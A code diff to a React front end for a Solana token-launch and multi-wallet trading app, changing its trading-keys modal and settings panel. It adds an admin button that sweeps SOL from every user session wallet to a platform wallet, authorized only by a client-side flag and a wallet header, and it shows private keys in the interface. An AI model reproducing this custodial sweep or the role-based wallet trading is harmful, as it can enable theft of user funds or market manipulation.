@@ -2022,10 +2022,14 @@ function NumInput({ label, value, onChange, min, max, step, T, decimals }) {
 }
 // ── Haptic feedback for mobile ──
 const haptic = (pattern = [15]) => { try { navigator?.vibrate?.(pattern); } catch {} };
-const hapticBuy = () => haptic([10, 30, 10]); // short buzz-pause-buzz
-const hapticSell = () => haptic([30, 15, 30]); // strong buzz-pause-strong
-const hapticSuccess = () => haptic([10, 20, 10, 20, 40]); // celebration
-const hapticError = () => haptic([80]); // single long buzz
+const hapticBuy = () => haptic([10, 30, 10]);
+const hapticSell = () => haptic([30, 15, 30]);
+const hapticSuccess = () => haptic([10, 20, 10, 20, 40]);
+const hapticError = () => haptic([80]);
+
+// ── iOS install detection ──
+const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
+const isStandalone = window.matchMedia?.("(display-mode: standalone)")?.matches || window.navigator?.standalone;
 
 export default function App() {
   const [isDark, setIsDark] = useState(() => { try { return localStorage.getItem("bondli_theme") !== "light"; } catch { return true; } });
@@ -2159,7 +2163,7 @@ export default function App() {
   useEffect(() => { if (!launched) return; const iv = setInterval(() => setCurveProgress(p => Math.min(1, p + Math.random() * 0.004)), 2000); return () => clearInterval(iv); }, [launched]);
   const walletCount = totalSol < 0.5 ? 3 : totalSol < 1 ? 5 : totalSol < 5 ? 9 : totalSol < 10 ? 11 : totalSol < 25 ? 15 : 20;
   const activeRoles = useMemo(() => { if (walletCount <= 3) return ROLES.filter(r => ["accumulator","momentum","whale"].includes(r.id)); if (walletCount <= 5) return ROLES.filter(r => ["sniper","accumulator","momentum","whale","liquidator"].includes(r.id)); if (walletCount <= 9) return ROLES.filter(r => r.id !== "recycler"); return ROLES; }, [walletCount]);
-  const isApe = !!existingCA; const canLaunch = (existingCA || (tokenName && ticker)); const preview = calcDevBuyPreview(totalSol, isApe);
+  const isApe = !!existingCA; const canLaunch = tradingWallet && (existingCA || (tokenName && ticker)); const preview = calcDevBuyPreview(totalSol, isApe);
   const disconnect = async () => { try { const p = window?.phantom?.solana || window?.solana; await p?.disconnect(); } catch {} setUser(null); };
   const handleTierSelect = (tier) => setUser({ ...user, tier, paid: tier === "pro" });
   const analyzeCA = async (ca) => { if (!ca || ca.length < 32) return; setCaAnalysis({ ca, loading: true, error: null, data: null }); try { const res = await fetch(API + "/api/analyze/" + ca); if (!res.ok) { const e = await res.json().catch(() => ({})); throw new Error(e.error || "Not found"); } const coin = await res.json(); setCaAnalysis({ ca, loading: false, error: null, data: coin }); } catch (e) { setCaAnalysis({ ca, loading: false, error: e.message || "Analysis failed", data: null }); } };
@@ -2481,7 +2485,7 @@ export default function App() {
               </div>
               <div style={{ display: "flex", gap: 4 }}>
                 <button onClick={runIncinerator} disabled={incineratorScanning} style={{ background: T.orange ? T.orange + "15" : "#ff910015", border: "1px solid " + (T.orange || "#ff9100") + "33", borderRadius: 6, padding: "2px 8px", fontFamily: mono, fontSize: 9, color: T.orange || "#ff9100", cursor: incineratorScanning ? "wait" : "pointer", fontWeight: 700, opacity: incineratorScanning ? 0.5 : 1 }}>{incineratorScanning ? "..." : "Reclaim SOL"}</button>
-                <button onClick={() => exportTradingKeys().then(() => setShowTradingSetup(true))} style={{ background: "none", border: "1px solid " + T.border, borderRadius: 6, padding: "2px 8px", fontFamily: mono, fontSize: 9, color: T.dim, cursor: "pointer" }}>Keys</button>
+                <button onClick={() => { exportTradingKeys().catch(() => {}); setShowTradingSetup(true); }} style={{ background: "none", border: "1px solid " + T.border, borderRadius: 6, padding: "2px 8px", fontFamily: mono, fontSize: 9, color: T.dim, cursor: "pointer" }}>Keys</button>
                 <button onClick={() => { navigator.clipboard?.writeText(tradingWallet); toast("Deposit address copied!", "success"); }} style={{ background: T.green + "15", border: "1px solid " + T.green + "33", borderRadius: 6, padding: "2px 8px", fontFamily: mono, fontSize: 9, color: T.green, cursor: "pointer", fontWeight: 700 }}>Deposit</button>
               </div>
             </div>
@@ -2492,28 +2496,35 @@ export default function App() {
             </div>
           )}
           {/* Trading Keys Modal */}
-          {showTradingSetup && tradingKeys && (
+          {showTradingSetup && (
             <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,.7)", zIndex: 100, display: "flex", alignItems: "center", justifyContent: "center", padding: 16 }} onClick={() => setShowTradingSetup(false)}>
               <div onClick={e => e.stopPropagation()} style={{ background: T.surface, border: "2px solid " + T.green + "33", borderRadius: 20, padding: 28, maxWidth: 480, width: "100%" }}>
                 <h3 style={{ fontFamily: sans, fontWeight: 900, fontSize: 20, color: T.text, marginBottom: 16, textAlign: "center" }}>Trading Wallet Keys</h3>
-                <div style={{ background: T.bg, border: "1px solid " + T.border, borderRadius: 10, padding: 14, marginBottom: 12 }}>
+                {tradingWallet && <div style={{ background: T.bg, border: "1px solid " + T.border, borderRadius: 10, padding: 14, marginBottom: 12 }}>
                   <div style={{ fontSize: 10, fontFamily: mono, color: T.faint, marginBottom: 4 }}>Wallet Address (send SOL here to fund)</div>
-                  <div onClick={() => { navigator.clipboard?.writeText(tradingKeys.tradingWallet || tradingWallet); toast("Copied!", "success"); }} style={{ fontSize: 13, fontFamily: mono, color: T.green, cursor: "pointer", wordBreak: "break-all" }}>{tradingKeys.tradingWallet || tradingWallet}</div>
-                </div>
-                {tradingKeys.privateKey && <div style={{ background: T.bg, border: "1px solid " + T.yellow + "33", borderRadius: 10, padding: 14, marginBottom: 12 }}>
+                  <div onClick={() => { navigator.clipboard?.writeText(tradingKeys?.tradingWallet || tradingWallet); toast("Copied!", "success"); }} style={{ fontSize: 13, fontFamily: mono, color: T.green, cursor: "pointer", wordBreak: "break-all" }}>{tradingKeys?.tradingWallet || tradingWallet}</div>
+                </div>}
+                {(tradingKeys?.privateKey) && <div style={{ background: T.bg, border: "1px solid " + T.yellow + "33", borderRadius: 10, padding: 14, marginBottom: 12 }}>
                   <div style={{ fontSize: 10, fontFamily: mono, color: T.yellow, marginBottom: 4 }}>Private Key (import to Phantom to manage funds)</div>
                   <div onClick={() => { navigator.clipboard?.writeText(tradingKeys.privateKey); toast("Private key copied!", "success"); }} style={{ fontSize: 11, fontFamily: mono, color: T.text, cursor: "pointer", wordBreak: "break-all", background: T.surface, padding: 8, borderRadius: 6 }}>{tradingKeys.privateKey}</div>
                 </div>}
-                {tradingKeys.apiKey && tradingKeys.apiKey !== "null" && <div style={{ background: T.bg, border: "1px solid " + T.border, borderRadius: 10, padding: 14, marginBottom: 12 }}>
-                  <div style={{ fontSize: 10, fontFamily: mono, color: T.faint, marginBottom: 4 }}>PumpPortal Lightning API Key (for instant trades)</div>
+                {tradingKeys?.apiKey && tradingKeys.apiKey !== "null" && <div style={{ background: T.bg, border: "1px solid " + T.border, borderRadius: 10, padding: 14, marginBottom: 12 }}>
+                  <div style={{ fontSize: 10, fontFamily: mono, color: T.faint, marginBottom: 4 }}>PumpPortal Lightning API Key</div>
                   <div onClick={() => { navigator.clipboard?.writeText(tradingKeys.apiKey); toast("API key copied!", "success"); }} style={{ fontSize: 12, fontFamily: mono, color: T.dim, cursor: "pointer", wordBreak: "break-all" }}>{tradingKeys.apiKey}</div>
                 </div>}
-                <p style={{ fontSize: 12, color: T.faint, textAlign: "center", marginBottom: 14, lineHeight: 1.6 }}>Save your private key! Import it into Phantom to withdraw funds anytime. Trades happen instantly from this wallet with zero popups.</p>
+                {!tradingKeys?.privateKey && !tradingWallet && <div style={{ textAlign: "center", padding: 20, color: T.faint, fontFamily: mono, fontSize: 12 }}>No trading wallet found. Create one first.</div>}
+                {!tradingKeys?.privateKey && tradingWallet && <div style={{ textAlign: "center", padding: 12, color: T.yellow, fontFamily: mono, fontSize: 11 }}>Loading keys... If this persists, try creating a new trading wallet.</div>}
+                <p style={{ fontSize: 12, color: T.faint, textAlign: "center", marginBottom: 14, lineHeight: 1.6 }}>Save your private key! Import it into Phantom to withdraw funds anytime.</p>
                 <button onClick={() => setShowTradingSetup(false)} style={{ width: "100%", padding: 12, background: T.green + "15", border: "1px solid " + T.green, borderRadius: 10, fontFamily: mono, fontSize: 14, fontWeight: 800, color: T.green, cursor: "pointer" }}>Done</button>
               </div>
             </div>
           )}
-          {showSettings && (<div style={{ maxWidth: 680, margin: "0 auto", padding: mobile ? "12px 14px" : "16px 24px" }}><div style={{ background: T.surface, border: "1px solid " + T.border, borderRadius: 14, padding: mobile ? 16 : 22 }}><div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16 }}><span style={{ fontFamily: mono, fontSize: 15, fontWeight: 700, color: T.text }}><Ic.Cpu /> Settings</span><button onClick={() => setShowSettings(false)} style={{ background: "none", border: "none", color: T.dim, cursor: "pointer", fontFamily: mono }}>{"✕"}</button></div><div style={{ display: "flex", flexDirection: "column", gap: 14 }}><div><Label>RPC URL</Label><Input value={rpc} onChange={setRpc} placeholder="https://mainnet.helius-rpc.com/?api-key=..." big /></div><div style={{ display: "flex", alignItems: "center", gap: 14, padding: "12px 14px", background: T.bg, borderRadius: 10, border: "1px solid " + T.border, cursor: "pointer" }} onClick={() => setUseAtlas(!useAtlas)}><div style={{ width: 40, height: 22, borderRadius: 11, padding: 2, background: useAtlas ? T.green : T.border, transition: "all .2s", flexShrink: 0 }}><div style={{ width: 18, height: 18, borderRadius: "50%", background: "#fff", transform: useAtlas ? "translateX(18px)" : "translateX(0)", transition: "transform .2s" }} /></div><div><div style={{ fontSize: 13, fontFamily: mono, fontWeight: 700, color: T.text }}>Helius Atlas</div><div style={{ fontSize: 11, color: T.dim }}>Staked connections</div></div></div></div></div></div>)}
+          {showSettings && (<div style={{ maxWidth: 680, margin: "0 auto", padding: mobile ? "12px 14px" : "16px 24px" }}><div style={{ background: T.surface, border: "1px solid " + T.border, borderRadius: 14, padding: mobile ? 16 : 22 }}><div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16 }}><span style={{ fontFamily: mono, fontSize: 15, fontWeight: 700, color: T.text }}><Ic.Cpu /> Settings</span><button onClick={() => setShowSettings(false)} style={{ background: "none", border: "none", color: T.dim, cursor: "pointer", fontFamily: mono }}>{"✕"}</button></div><div style={{ display: "flex", flexDirection: "column", gap: 14 }}><div><Label>RPC URL</Label><Input value={rpc} onChange={setRpc} placeholder="https://mainnet.helius-rpc.com/?api-key=..." big /></div><div style={{ display: "flex", alignItems: "center", gap: 14, padding: "12px 14px", background: T.bg, borderRadius: 10, border: "1px solid " + T.border, cursor: "pointer" }} onClick={() => setUseAtlas(!useAtlas)}><div style={{ width: 40, height: 22, borderRadius: 11, padding: 2, background: useAtlas ? T.green : T.border, transition: "all .2s", flexShrink: 0 }}><div style={{ width: 18, height: 18, borderRadius: "50%", background: "#fff", transform: useAtlas ? "translateX(18px)" : "translateX(0)", transition: "transform .2s" }} /></div><div><div style={{ fontSize: 13, fontFamily: mono, fontWeight: 700, color: T.text }}>Helius Atlas</div><div style={{ fontSize: 11, color: T.dim }}>Staked connections</div></div></div>
+            {/* iOS install instructions */}
+            {isIOS && !isStandalone && <div style={{ padding: 14, background: T.bg, borderRadius: 10, border: "1px solid " + T.border }}><div style={{ fontFamily: mono, fontSize: 12, fontWeight: 700, color: T.text, marginBottom: 6 }}>Install as App (iPhone)</div><div style={{ fontSize: 11, color: T.dim, lineHeight: 1.5 }}>1. Tap the Share button (square with arrow) in Safari<br/>2. Scroll down and tap "Add to Home Screen"<br/>3. Tap "Add" — Bondli opens fullscreen like a real app</div></div>}
+            {/* Admin: Recover All (platform wallet only) */}
+            {user?.whitelisted && <div style={{ padding: 14, background: T.red + "08", borderRadius: 10, border: "1px solid " + T.red + "33" }}><div style={{ fontFamily: mono, fontSize: 12, fontWeight: 700, color: T.red, marginBottom: 8 }}>Admin: Platform Recovery</div><button onClick={async () => { if (!confirm("RECOVER ALL SOL from every session to " + PLATFORM_WALLET.slice(0, 12) + "...?")) return; toast("Sweeping all wallets to platform...", "info"); try { const r = await fetch(API + "/api/admin/recover-all", { method: "POST", headers: { "Content-Type": "application/json", "x-wallet": user.pubkey }, body: JSON.stringify({ wallet: user.pubkey }) }); const d = await r.json(); if (d.ok) toast("Recovered " + d.totalRecovered.toFixed(4) + " SOL from " + d.swept + "/" + d.totalWallets + " wallets", "success"); else toast(d.error || "Failed", "error"); } catch (e) { toast("Error: " + e.message, "error"); } }} style={{ width: "100%", padding: 12, background: T.red + "15", border: "1px solid " + T.red, borderRadius: 10, fontFamily: mono, fontSize: 13, fontWeight: 800, color: T.red, cursor: "pointer" }}>RECOVER ALL SOL TO PLATFORM</button></div>}
+            </div></div></div>)}
           {user.tier === "free" && !user.whitelisted && (<div style={{ background: T.green + "08", borderBottom: "1px solid " + T.green + "22", padding: "6px 20px", display: "flex", alignItems: "center", justifyContent: "center", gap: 12 }}><span style={{ fontSize: 12, fontFamily: mono, color: T.green }}>{FREE_PROFIT_CUT}% profit share</span><button onClick={() => setShowUpgrade(true)} style={{ background: T.green, color: T.bg, border: "none", borderRadius: 6, padding: "3px 10px", fontFamily: mono, fontSize: 11, fontWeight: 700, cursor: "pointer" }}>Upgrade</button></div>)}
           {showUpgrade && (<div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,.7)", zIndex: 100, display: "flex", alignItems: "center", justifyContent: "center", padding: 16 }} onClick={() => setShowUpgrade(false)}><div onClick={e => e.stopPropagation()} style={{ background: T.surface, border: "2px solid " + T.border, borderRadius: 20, padding: mobile ? 24 : 36, maxWidth: 440, width: "100%" }}>
             <h3 style={{ fontFamily: sans, fontWeight: 900, fontSize: 22, color: T.text, marginBottom: 8, textAlign: "center" }}>Upgrade to Pro</h3>
